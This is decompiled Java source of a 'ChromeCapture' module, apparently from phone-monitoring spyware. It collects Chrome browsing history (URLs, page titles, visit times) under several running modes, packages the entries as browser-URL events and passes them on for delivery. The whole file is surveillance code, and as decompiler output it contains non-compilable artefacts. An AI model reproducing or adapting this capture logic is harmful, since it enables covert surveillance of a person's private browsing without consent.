package com.vvt.capture.chrome;

import android.content.ContentResolver;
import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.g;
import com.vvt.events.FxBrowserUrlEvent;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private com.vvt.base.a c;
  private String d;
  private com.vvt.base.capture.e e;
  private com.vvt.base.capture.f f;
  
  public a(String paramString1, RunningMode paramRunningMode, Context paramContext, com.vvt.base.a parama, String paramString2, com.vvt.n.a.b paramb)
  {
    this.d = paramString1;
    this.c = parama;
    Object localObject1 = paramContext.getContentResolver();
    Object localObject2 = RunningMode.FULL;
    boolean bool1;
    if (paramRunningMode == localObject2)
    {
      bool1 = b;
      if (bool1) {}
      localObject1 = new com/vvt/capture/chrome/a/c;
      localObject2 = this.d;
      ((com.vvt.capture.chrome.a.c)localObject1).<init>((String)localObject2);
      this.e = ((com.vvt.base.capture.e)localObject1);
      localObject1 = new com/vvt/capture/chrome/a/f;
      localObject2 = this.d;
      ((com.vvt.capture.chrome.a.f)localObject1).<init>((String)localObject2, paramString2);
      this.f = ((com.vvt.base.capture.f)localObject1);
    }
    for (;;)
    {
      return;
      localObject2 = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject2)
      {
        bool1 = b;
        if (bool1) {}
        localObject1 = new com/vvt/capture/chrome/b/b;
        ((com.vvt.capture.chrome.b.b)localObject1).<init>(paramb);
        this.e = ((com.vvt.base.capture.e)localObject1);
        localObject1 = new com/vvt/capture/chrome/b/c;
        ((com.vvt.capture.chrome.b.c)localObject1).<init>(paramString1, paramString2);
        this.f = ((com.vvt.base.capture.f)localObject1);
      }
      else
      {
        boolean bool2 = b;
        if (bool2) {}
        localObject2 = new com/vvt/capture/chrome/c/b;
        ((com.vvt.capture.chrome.c.b)localObject2).<init>((ContentResolver)localObject1);
        this.e = ((com.vvt.base.capture.e)localObject2);
        localObject2 = new com/vvt/capture/chrome/c/e;
        ((com.vvt.capture.chrome.c.e)localObject2).<init>((ContentResolver)localObject1);
        this.f = ((com.vvt.base.capture.f)localObject2);
      }
    }
  }
  
  private FxBrowserUrlEvent a(ChromeUrlData paramChromeUrlData)
  {
    FxBrowserUrlEvent localFxBrowserUrlEvent = new com/vvt/events/FxBrowserUrlEvent;
    localFxBrowserUrlEvent.<init>();
    long l = paramChromeUrlData.a();
    localFxBrowserUrlEvent.setEventId(l);
    l = paramChromeUrlData.d();
    localFxBrowserUrlEvent.setEventTime(l);
    String str = paramChromeUrlData.b();
    localFxBrowserUrlEvent.setTitle(str);
    str = paramChromeUrlData.c();
    localFxBrowserUrlEvent.setUrl(str);
    l = paramChromeUrlData.e();
    localFxBrowserUrlEvent.setVisitTimeMs(l);
    localFxBrowserUrlEvent.setOwningApp("com.android.chrome");
    localFxBrowserUrlEvent.setBlocked(false);
    return localFxBrowserUrlEvent;
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public List a()
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = this.f;
    boolean bool2 = localObject2 instanceof com.vvt.capture.chrome.c.e;
    if (bool2) {
      localObject1 = ((com.vvt.capture.chrome.c.e)this.f).b();
    }
    for (;;)
    {
      localObject2 = ((List)localObject1).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject2).hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = (ChromeUrlData)((Iterator)localObject2).next();
        localObject1 = a((ChromeUrlData)localObject1);
        localArrayList.add(localObject1);
        bool1 = a;
        if (!bool1) {}
      }
      localObject2 = this.f;
      bool2 = localObject2 instanceof com.vvt.capture.chrome.a.f;
      if (bool2) {
        localObject1 = ((com.vvt.capture.chrome.a.f)this.f).b();
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  protected void a(List paramList)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool3 = localObject instanceof ChromeUrlData;
        if (bool3)
        {
          localObject = (ChromeUrlData)localObject;
          String str = ((ChromeUrlData)localObject).b();
          bool3 = com.vvt.ag.b.a(str);
          if (!bool3)
          {
            localObject = a((ChromeUrlData)localObject);
            localArrayList.add(localObject);
          }
        }
      }
      Object localObject = this.c;
      if (localObject != null)
      {
        int i = localArrayList.size();
        if (i > 0)
        {
          bool2 = k();
          if (bool2)
          {
            bool2 = b;
            if (bool2) {}
            localObject = this.c;
            ((com.vvt.base.a)localObject).a(localArrayList);
          }
        }
      }
    }
    boolean bool2 = a;
    if (bool2) {}
  }
  
  protected com.vvt.base.capture.e b()
  {
    return this.e;
  }
  
  protected com.vvt.base.capture.f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "ChromeCapture";
  }
  
  protected String e()
  {
    return this.d;
  }
  
  protected String f()
  {
    return "chrome.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */